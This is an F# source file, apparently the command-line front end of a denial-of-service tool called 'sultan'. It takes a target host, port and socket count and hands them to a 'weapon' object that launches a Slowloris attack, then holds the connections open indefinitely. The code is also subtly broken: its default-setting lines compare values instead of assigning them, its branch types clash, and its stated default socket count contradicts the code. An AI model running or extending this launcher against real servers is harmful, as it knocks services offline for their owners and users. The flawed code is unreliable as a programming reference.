#nowarn "20"

open sultan

open System
open System.Threading

module sultan =

    let E : string = string (char 0x1B)

    let invoke_slowloris (args : string[]) =
        if args.Length < 2 then
            printfn "%s[38;2;255;0;0mERROR 002 Target host not provided%s[0m" E E
            failwith "ERROR See previous error for more information"
            else printfn "[sultan] starting..."

        if args.Length < 3 then
            printfn "[sultan] No port provided, defaulting to port 80"
            args.[2] = "80"
            else false

        if args.Length < 4 then
            printfn "[sultan] No socket number provided, defaulting to 10 sockets"
            args.[3] = "10"
            else false

        let weapon = new sllib()
        weapon.attack(args.[1], Int32.Parse(args.[2]), false, Int32.Parse(args.[3]));
        Thread.Sleep(Timeout.Infinite);
        0

    let help =
        printfn "sultan v0.2.1"
        printfn "MIT (c) Kied Llaentenn\n"
        printfn "Usage: .\sultan slowloris [host] [port (default: 80)] [socket_count (default: 100)]"
        0 |> ignore

    [<EntryPoint>]
    let main argv =
        consoletool.enableVTMode() |> ignore
        // go nuts if there aren't enough args
        if argv.Length < 1 then
            help
            printfn "%s[38;2;255;0;0mERROR 001 Not enough arguments%s[0m" E E
            failwith "ERROR See previous error for more information"
        else

        if (argv.[0]).Equals("slowloris") then invoke_slowloris argv else 0
        0

